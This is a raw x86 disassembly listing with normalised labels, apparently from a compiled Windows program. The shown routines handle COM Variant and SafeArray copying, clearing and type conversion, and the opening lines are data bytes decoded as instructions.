add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
out 0x40 al
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
outsd
retn 0x40e7
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
sbb al [ ebp + 0x56 ]
popad
jb r-xdata
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
dec esi
jne r-xdata
push 0x6f727245
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
push esp
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
out 0x40 eax
outsd
jb r-xdata
jb r-xdata
retn
popad
outsb
je r-xdata
pop ebx
call 0xffffffffffa4e82d
xor [ ecx + ecx * 4 + 0x20 ] ah
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413f48
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413f48
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e862
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403edc
retn
call 0xffffffff8c253569
mov ebx eax
xor eax eax
push ebp
push sub_40e85b
push [ fs : eax ]
mov [ fs : eax ] esp
insb
dec edi
jo r-xdata
rcr [ edi + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc ebp
out 0x40 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e7c9
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
outsb
add [ ebp - 0x81703bb ] cl
push esi
jb r-xdata
sub_40e778
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e7c2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e7c9
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40e7cc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e85b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413f48
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413f48
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e862
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403edc
retn
sub_40e868
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e8b2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e8b9
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40e8bc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e906
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e90d
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40e910
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e99f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413f48
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413f48
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e9a6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403edc
retn
sub_40e9ac
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e9f6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e9fd
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40ea00
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40ec45
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ec4c
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403edc
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403edc
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
jmp r-xdata
dec eax
je r-xdata
call sub_40e778
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
jmp r-xdata
jmp r-xdata
call sub_40e868
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40aff4
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
jmp r-xdata
jmp r-xdata
sub_40ec60
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e7cc
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e910
jmp r-xdata
jmp r-xdata
call sub_40ea00
sub_40ec94
push ebx
push esi
mov esi edx
mov ebx eax
call sub_40275c
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
call sub_40275c
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ec60
pop esi
pop ebx
retn
call sub_40275c
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ec60
jmp r-xdata
call sub_40279c
mov edx eax
mov eax edx
call sub_4038f4
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40ec60
jmp r-xdata
pop esi
pop ebx
retn
sub_40ed18
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ed62
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed69
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40ed80
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40edb0
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40edb0
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ee0c
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ec54
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40ec54
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ed80
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40ec54
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40ec54
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40edb0
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ec54
mov eax [ ebp - 0x314 ]
call sub_40f004
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40ef88
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40ec54
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403eb8
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_414518
test al al
je r-xdata
mov eax ebx
call sub_40ee0c
jmp r-xdata
push ebx
call VariantClear
call sub_40ec54
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40f020
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f050
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f050
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f0ac
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ec54
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40ec54
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40f004
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e9ac
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40ec54
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40ec54
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f020
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40f050
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ec54
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40ec54
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f280
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40ef88
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40ec54
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403f0c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_414518
test al al
je r-xdata
mov ecx sub_40f278
mov edx esi
mov eax ebx
call sub_40f0ac
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40ec54
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f32c
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f280
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40ef88
sub_40f370
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f3cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f32c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f5f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f3d3
lea eax [ ebp - 0x10 ]
call sub_40f004
retn
sub_40f3dc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f41a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412a44
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4133f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f421
lea eax [ ebp - 0x4 ]
call sub_4045c4
retn
sub_40f428
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f466
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_41231c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4133c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f46d
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40f474
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f4b2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4130e8
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413458
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f4b9
lea eax [ ebp - 0x4 ]
call sub_4057b4
retn
sub_40f4c0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f4fe
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_41301c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_41342c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f505
lea eax [ ebp - 0x4 ]
call sub_4057b4
retn
sub_40f50c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40f5f8
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ec60
jmp r-xdata
mov edx esi
call sub_40e7cc
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ec60
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f58c
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_414518
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f370
jmp r-xdata
mov edx esp
mov eax esi
call sub_414518
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f50c
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40f5f8
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f32c
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f5f8
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f63d ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f428
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40ed6c
jmp r-xdata
mov eax ebx
call sub_40ff64
mov edx eax
mov eax esi
call sub_413270
jmp r-xdata
mov eax ebx
call sub_40f9bc
mov edx eax
mov eax esi
call sub_4131d0
jmp r-xdata
mov eax ebx
call sub_411328
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_4132bc
jmp r-xdata
mov eax ebx
call sub_410f90
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_4132e0
jmp r-xdata
mov eax ebx
call sub_411c68
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_41330c
jmp r-xdata
mov eax ebx
call sub_411700
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413338
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f3dc
jmp r-xdata
mov eax ebx
call sub_410a7c
mov edx eax
mov eax esi
call sub_413364
jmp r-xdata
mov eax ebx
call sub_40fe0c
mov edx eax
mov eax esi
call sub_413250
jmp r-xdata
mov eax ebx
call sub_40febc
mov edx eax
mov eax esi
call sub_4131f0
jmp r-xdata
mov eax ebx
call sub_41005c
mov edx eax
mov eax esi
call sub_413210
jmp r-xdata
mov eax ebx
call sub_410134
mov edx eax
mov eax esi
call sub_413230
jmp r-xdata
mov eax ebx
call sub_410480
push edx
push eax
mov eax esi
call sub_413290
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f474
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f4c0
jmp r-xdata
mov dx 0x101
call sub_40e7cc
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40f004
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40f58c
xor edx edx
mov ax 0x1
call sub_40e7cc
jmp r-xdata
sub_40f824
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f8c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412a44
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404140
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_408238
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f8ce
lea eax [ ebp - 0xc ]
call sub_403eb8
lea eax [ ebp - 0x8 ]
call sub_4045c4
retn
mov eax ebx
call sub_410a7c
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40ec60
jmp r-xdata
sub_40f8d8
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40ec60
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40f914
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f968
push [ fs : eax ]
